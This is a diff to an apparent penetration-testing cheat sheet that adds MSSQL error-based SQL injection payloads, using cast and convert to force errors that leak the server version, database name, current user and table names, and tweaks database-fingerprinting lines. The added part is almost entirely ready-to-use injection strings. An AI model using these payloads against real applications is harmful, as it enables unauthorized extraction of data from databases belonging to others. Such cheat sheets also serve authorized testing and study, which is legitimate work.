@@ -1994,6 +1994,25 @@ msf-pattern_offset -l length_here -q EIP_bytes_here
 ```sql
 # connect to a db server as user
 mssql -s IP_db_server -o port -u username -p password
+
+# error-based SQLi with cast / convert
+## numeric data
+cast((SELECT @@version) as int)
+convert(int,@@version)
+
+## string
+' + cast((SELECT @@version) as int) + '
+' + convert(int,@@version) + '
+
+## possible replacements for @@version
+### database name
+db_name()
+### current user
+user_name()
+### table names
+(select+top+1+table_name+from+information_schema.tables) # first table
+(select+top+1+table_name+from+information_schema.tables+where+table_name+
+    not+in+('first_table_name_here','second_table_name_here')) # subsequent tables
 ```
 
 
@@ -3399,12 +3418,12 @@ UNION ALL SELECT 1,2,...,no_columns_here
 # fingerprint database
 ## strings
 'wurzel'||'sepp' # Oracle
-'wurzel'+'sepp' # MS-SQL
+'wurzel'+'sepp' # MSSQL
 'wurzel' 'sepp' # MySQL
 
 ## numeric data : 0 on target db, error on any other db
 BITAND(1,1)-BITAND(1,1) # Oracle
-@@PACK_RECEIVED-@@PACK_RECEIVED # MS-SQL
+@@PACK_RECEIVED-@@PACK_RECEIVED # MSSQL
 CONNECTION_ID()-CONNECTION_ID() # MySQL
 ```
 
